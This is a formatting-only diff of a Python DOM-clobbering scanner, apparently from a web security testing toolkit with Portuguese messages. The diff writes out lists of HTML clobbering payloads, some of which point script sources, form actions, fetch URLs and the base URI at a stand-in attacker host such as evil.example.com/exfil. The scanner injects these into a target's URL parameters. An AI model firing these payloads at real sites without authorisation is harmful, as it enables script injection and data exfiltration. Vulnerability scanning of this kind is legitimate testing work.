@@ -166,34 +166,109 @@ _COMMON_JS_GLOBS_DEFAULT: frozenset[str] = frozenset(
 
 
 _NAMED_ACCESS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
-    ("window_anchor_id", '<a id="{name}" href="javascript:void(0)">', "id", ["a", "id="]),
+    (
+        "window_anchor_id",
+        '<a id="{name}" href="javascript:void(0)">',
+        "id",
+        ["a", "id="],
+    ),
     ("window_div_id", '<div id="{name}"></div>', "id", ["div", "id="]),
     ("window_form_name", '<form name="{name}"></form>', "name", ["form", "name="]),
-    ("window_iframe_name", '<iframe name="{name}"></iframe>', "name", ["iframe", "name="]),
+    (
+        "window_iframe_name",
+        '<iframe name="{name}"></iframe>',
+        "name",
+        ["iframe", "name="],
+    ),
     ("window_embed_name", '<embed name="{name}">', "name", ["embed", "name="]),
-    ("window_object_name", '<object name="{name}"></object>', "name", ["object", "name="]),
+    (
+        "window_object_name",
+        '<object name="{name}"></object>',
+        "name",
+        ["object", "name="],
+    ),
     ("window_img_name", '<img name="{name}" src="x">', "name", ["img", "name="]),
     ("window_svg_name", '<svg name="{name}"></svg>', "name", ["svg", "name="]),
 ]
 
 
 _FORM_CHILD_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
-    ("form_input_name", '<form id="{name}"><input name="action" value="javascript:void(0)"></form>', "action", ["input", "name="]),
-    ("form_button_name", '<form id="{name}"><button name="action" value="/admin"></button></form>', "action", ["button", "name="]),
-    ("form_select_name", '<form id="{name}"><select name="target"><option value="evil"></select></form>', "target", ["select", "name="]),
-    ("form_textarea_name", '<form id="{name}"><textarea name="data">payload</textarea></form>', "data", ["textarea", "name="]),
-    ("form_fieldset_name", '<form id="{name}"><fieldset name="settings"></fieldset></form>', "settings", ["fieldset", "name="]),
-    ("form_output_name", '<form id="{name}"><output name="result">payload</output></form>', "result", ["output", "name="]),
+    (
+        "form_input_name",
+        '<form id="{name}"><input name="action" value="javascript:void(0)"></form>',
+        "action",
+        ["input", "name="],
+    ),
+    (
+        "form_button_name",
+        '<form id="{name}"><button name="action" value="/admin"></button></form>',
+        "action",
+        ["button", "name="],
+    ),
+    (
+        "form_select_name",
+        '<form id="{name}"><select name="target"><option value="evil"></select></form>',
+        "target",
+        ["select", "name="],
+    ),
+    (
+        "form_textarea_name",
+        '<form id="{name}"><textarea name="data">payload</textarea></form>',
+        "data",
+        ["textarea", "name="],
+    ),
+    (
+        "form_fieldset_name",
+        '<form id="{name}"><fieldset name="settings"></fieldset></form>',
+        "settings",
+        ["fieldset", "name="],
+    ),
+    (
+        "form_output_name",
+        '<form id="{name}"><output name="result">payload</output></form>',
+        "result",
+        ["output", "name="],
+    ),
 ]
 
 
 _IMPACT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
-    ("script_src_clobber", '<a id="{name}" href="//evil.example.com/evil.js">', "script.src", ["a", "id=", "href="]),
-    ("form_action_clobber", '<form id="{name}"><input name="action" value="https://evil.example.com"></form>', "form.action", ["form", "input", "name="]),
-    ("location_href_clobber", '<a id="{name}" href="javascript:alert(1)">', "location.href", ["a", "id=", "href=", "javascript:"]),
-    ("fetch_url_clobber", '<a id="{name}" href="//evil.example.com/exfil">', "fetch(url)", ["a", "id=", "href="]),
-    ("base_uri_clobber", '<base id="{name}" href="//evil.example.com/">', "document.baseURI", ["base", "id=", "href="]),
-    ("currentscript_clobber", '<img name="{name}" src="//evil.example.com/evil.js">', "currentScript.src", ["img", "name=", "src="]),
+    (
+        "script_src_clobber",
+        '<a id="{name}" href="//evil.example.com/evil.js">',
+        "script.src",
+        ["a", "id=", "href="],
+    ),
+    (
+        "form_action_clobber",
+        '<form id="{name}"><input name="action" value="https://evil.example.com"></form>',
+        "form.action",
+        ["form", "input", "name="],
+    ),
+    (
+        "location_href_clobber",
+        '<a id="{name}" href="javascript:alert(1)">',
+        "location.href",
+        ["a", "id=", "href=", "javascript:"],
+    ),
+    (
+        "fetch_url_clobber",
+        '<a id="{name}" href="//evil.example.com/exfil">',
+        "fetch(url)",
+        ["a", "id=", "href="],
+    ),
+    (
+        "base_uri_clobber",
+        '<base id="{name}" href="//evil.example.com/">',
+        "document.baseURI",
+        ["base", "id=", "href="],
+    ),
+    (
+        "currentscript_clobber",
+        '<img name="{name}" src="//evil.example.com/evil.js">',
+        "currentScript.src",
+        ["img", "name=", "src="],
+    ),
 ]
 
 
@@ -201,7 +276,9 @@ def _load_category_map() -> dict[str, list[str]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    data = load_payloads(
+        "web", "domclobbering", default={"category_map": _CATEGORY_MAP_DEFAULT}
+    )
 
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
@@ -213,7 +290,11 @@ def _load_window_clobberable() -> set[str]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"window_clobberable": list(_WINDOW_CLOBBERABLE_DEFAULT)})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={"window_clobberable": list(_WINDOW_CLOBBERABLE_DEFAULT)},
+    )
 
     return set(data.get("window_clobberable", list(_WINDOW_CLOBBERABLE_DEFAULT)))
 
@@ -225,7 +306,11 @@ def _load_document_clobberable() -> set[str]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"document_clobberable": list(_DOCUMENT_CLOBBERABLE_DEFAULT)})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={"document_clobberable": list(_DOCUMENT_CLOBBERABLE_DEFAULT)},
+    )
 
     return set(data.get("document_clobberable", list(_DOCUMENT_CLOBBERABLE_DEFAULT)))
 
@@ -237,7 +322,11 @@ def _load_common_js_globs() -> set[str]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"common_js_globs": list(_COMMON_JS_GLOBS_DEFAULT)})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={"common_js_globs": list(_COMMON_JS_GLOBS_DEFAULT)},
+    )
 
     return set(data.get("common_js_globs", list(_COMMON_JS_GLOBS_DEFAULT)))
 
@@ -249,9 +338,20 @@ def _load_named_access_payloads() -> list[tuple[str, str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"named_access_payloads": [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={
+            "named_access_payloads": [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT]
+        },
+    )
 
-    return [tuple(item) for item in data.get("named_access_payloads", [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT])]
+    return [
+        tuple(item)
+        for item in data.get(
+            "named_access_payloads", [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT]
+        )
+    ]
 
 
 _NAMED_ACCESS_PAYLOADS = _load_named_access_payloads()
@@ -261,9 +361,20 @@ def _load_form_child_payloads() -> list[tuple[str, str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"form_child_payloads": [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={
+            "form_child_payloads": [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT]
+        },
+    )
 
-    return [tuple(item) for item in data.get("form_child_payloads", [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT])]
+    return [
+        tuple(item)
+        for item in data.get(
+            "form_child_payloads", [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT]
+        )
+    ]
 
 
 _FORM_CHILD_PAYLOADS = _load_form_child_payloads()
@@ -273,9 +384,18 @@ def _load_impact_payloads() -> list[tuple[str, str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "domclobbering", default={"impact_payloads": [list(t) for t in _IMPACT_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "domclobbering",
+        default={"impact_payloads": [list(t) for t in _IMPACT_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(item) for item in data.get("impact_payloads", [list(t) for t in _IMPACT_PAYLOADS_DEFAULT])]
+    return [
+        tuple(item)
+        for item in data.get(
+            "impact_payloads", [list(t) for t in _IMPACT_PAYLOADS_DEFAULT]
+        )
+    ]
 
 
 _IMPACT_PAYLOADS = _load_impact_payloads()
@@ -440,7 +560,9 @@ async def _test_named_access(
     results: list[ClobberAttempt] = []
 
     try:
-        b_status, _b_headers, _b_body, _b_raw_headers = await fetch(client, url, timeout=timeout)
+        b_status, _b_headers, _b_body, _b_raw_headers = await fetch(
+            client, url, timeout=timeout
+        )
 
         b_size = len(_b_body)
 
@@ -474,11 +596,15 @@ async def _test_named_access(
             test_url = _inject_payload(url, param, payload)
 
             try:
-                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)
+                t_status, _t_headers, t_body, _t_raw = await fetch(
+                    client, test_url, timeout=timeout
+                )
 
                 t_size = len(t_body)
 
-                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)
+                reflected = _check_clobber_in_html(
+                    t_body.decode(errors="replace"), payload
+                )
 
                 status_changed = t_status != b_status
 
@@ -489,7 +615,9 @@ async def _test_named_access(
                 details = ""
 
                 if reflected:
-                    details = f"Payload refletido no HTML â€” window.{clob_name} clobberavel"
+                    details = (
+                        f"Payload refletido no HTML â€” window.{clob_name} clobberavel"
+                    )
 
                 elif status_changed:
                     details = f"Status mudou: {b_status} -> {t_status}"
@@ -554,7 +682,9 @@ async def _test_form_child(
     results: list[ClobberAttempt] = []
 
     try:
-        b_status, _b_headers, _b_body, _b_raw = await fetch(client, url, timeout=timeout)
+        b_status, _b_headers, _b_body, _b_raw = await fetch(
+            client, url, timeout=timeout
+        )
 
         b_size = len(_b_body)
 
@@ -588,11 +718,15 @@ async def _test_form_child(
             test_url = _inject_payload(url, param, payload)
 
             try:
-                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)
+                t_status, _t_headers, t_body, _t_raw = await fetch(
+                    client, test_url, timeout=timeout
+                )
 
                 t_size = len(t_body)
 
-                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)
+                reflected = _check_clobber_in_html(
+                    t_body.decode(errors="replace"), payload
+                )
 
                 status_changed = t_status != b_status
 
@@ -668,7 +802,9 @@ async def _test_impact_chains(
     results: list[ClobberAttempt] = []
 
     try:
-        b_status, _b_headers, _b_body, _b_raw = await fetch(client, url, timeout=timeout)
+        b_status, _b_headers, _b_body, _b_raw = await fetch(
+            client, url, timeout=timeout
+        )
 
         b_size = len(_b_body)
 
@@ -702,11 +838,15 @@ async def _test_impact_chains(
             test_url = _inject_payload(url, param, payload)
 
             try:
-                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)
+                t_status, _t_headers, t_body, _t_raw = await fetch(
+                    client, test_url, timeout=timeout
+                )
 
                 t_size = len(t_body)
 
-                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)
+                reflected = _check_clobber_in_html(
+                    t_body.decode(errors="replace"), payload
+                )
 
                 status_changed = t_status != b_status
 
@@ -717,7 +857,9 @@ async def _test_impact_chains(
                 details = ""
 
                 if reflected:
-                    details = f"Payload refletido â€” {sink} clobberavel via {clob_name}"
+                    details = (
+                        f"Payload refletido â€” {sink} clobberavel via {clob_name}"
+                    )
 
                 elif status_changed:
                     details = f"Status mudou: {b_status} -> {t_status}"
@@ -787,7 +929,12 @@ def print_results(result: ClobberResult) -> None:
 
     print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
 
-    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))
+    print(
+        color(
+            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.WHITE,
+        )
+    )
 
     print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
 
@@ -821,10 +968,20 @@ def print_results(result: ClobberResult) -> None:
 
             print_exploit_info(a.exploit, a.tool)
 
-        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))
+        print(
+            color(
+                f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes",
+                Cyber.WHITE,
+            )
+        )
 
     else:
-        print(color("\n  [+] Nenhuma vulnerabilidade de DOM Clobbering detectada", Cyber.GREEN))
+        print(
+            color(
+                "\n  [+] Nenhuma vulnerabilidade de DOM Clobbering detectada",
+                Cyber.GREEN,
+            )
+        )
 
     if result.issues:
         print(color("\n  [!] Observacoes:", Cyber.YELLOW))
@@ -847,7 +1004,9 @@ async def run_scan(
 
     async with create_async_client(timeout=timeout) as client:
         try:
-            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)
+            b_status, _b_headers, b_body, _b_raw = await fetch(
+                client, target, timeout=timeout
+            )
 
             b_size = len(b_body)
 
@@ -898,7 +1057,9 @@ async def run_scan(
 
         vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
 
-        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
+        blocked_techs = list(
+            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
+        )
 
         issues: list[str] = []
 
@@ -906,7 +1067,9 @@ async def run_scan(
             issues.append("Nenhum teste de DOM Clobbering executado")
 
         if passive_findings:
-            issues.append(f"{len(passive_findings)} padroes de clobbering detectados passivamente")
+            issues.append(
+                f"{len(passive_findings)} padroes de clobbering detectados passivamente"
+            )
 
         result = ClobberResult(
             target=target,
@@ -917,7 +1080,9 @@ async def run_scan(
             vulnerable_techniques=vuln_techs,
             blocked_techniques=blocked_techs,
             issues=issues,
-            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
+            overall_status="vulnerable"
+            if vuln_techs
+            else ("safe" if blocked_techs else "unknown"),
         )
 
         print_results(result)
@@ -1015,7 +1180,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="domclob> ",
         description="DOM Clobbering interativo.",
         example="https://target.com -c named_access",
